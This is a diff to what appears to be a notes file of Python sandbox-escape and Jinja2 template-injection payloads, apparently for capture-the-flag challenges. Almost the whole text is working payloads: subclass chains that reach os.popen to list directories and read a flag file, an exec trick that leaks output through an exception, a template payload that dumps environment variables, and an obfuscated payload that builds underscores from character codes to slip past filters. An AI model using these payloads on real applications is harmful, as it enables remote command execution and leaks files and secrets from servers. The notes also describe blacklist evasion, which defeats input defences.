@@ -15,6 +15,8 @@
 ().__class__.__bases__[0].__subclasses__()
 ```
 
+
+
 ```python
 getattr(().__class__.__base__, "__subclasses__")()
 ```
@@ -43,6 +45,8 @@ getattr(().__class__.__bases__[0], "__subclasses__")()
 ().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
 ```
 
+
+
 ```python
 exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat'+' '+'/'+'f'+'l'+'a'+'g').read();raise Exception(f'{error}')")
 ```
@@ -51,8 +55,16 @@ exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__
 exec("error=\"abc\";raise Exception("abc")")
 ```
 
+
+
 ```python
 {{lipsum.__globals__.os.popen('env').read()}}
+```
+
+
+
+```shell
+{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
 ```
 
 
